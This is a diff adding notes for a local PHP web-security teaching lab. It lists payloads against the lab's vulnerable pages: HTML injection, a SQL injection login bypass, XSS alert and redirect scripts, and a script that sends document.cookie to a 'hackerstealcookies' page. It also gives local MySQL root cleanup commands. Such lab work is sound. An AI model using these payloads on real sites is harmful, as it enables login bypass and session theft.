@@ -1,0 +1,58 @@
+HTML injection:
+---------------
+http://localhost:8888/php-security/html-injection/htmlinjection.php
+value=""/><hr/><input type = "submit" value = "HTML Injection"
+
+http://localhost:8888/php-security/html-injection/htmlinjectionprevention.php
+value=""/><hr/><input type = "submit" value = "HTML Injection"
+
+Hint: View page source!!!
+
+SQL injection
+--------------
+http://localhost:8888/php-security/sql-injection/sqlinjection.php
+
+Attack: Login bypass attack / Successfully login, without knowing the username nor password!!!
+
+In username box -> 
+newuser' OR '1'='1
+In password box -> 
+newuser' OR '1'='1
+
+XSS
+---
+Reflected XSS!!!
+----------------
+http://localhost:8888/php-security/xss/reflectedxss.php
+<script>alert("Attempting xss attack!")</script>
+
+Stealing cookies!!!
+-------------------
+
+
+Stored XSS!!!
+-------------
+http://localhost:8888/php-security/xss/xss.php
+
+In comments box->
+<script>alert("Attempting xss attack!")</script>
+
+<script>window.location='http://www.google.com/'</script>
+
+To come out of this,
+/Applications/MAMP/Library/bin/mysql --host=localhost -uroot -proot
+use php-security
+select * from xss_demo;
+delete from xss_demo;
+
+
+Stealing cookies!!!
+------------------
+<script>window.location = 'http://localhost:8888/php-security/xss/hackerstealcookies/index.php?cookies='+encodeURI(document.cookie);</script>
+
+After executing the above, it should redirect to the hackerstealcookies page!!!
+http://localhost:8888/php-security/xss/xss.php
+
+
+xsrf/csrf
+---------
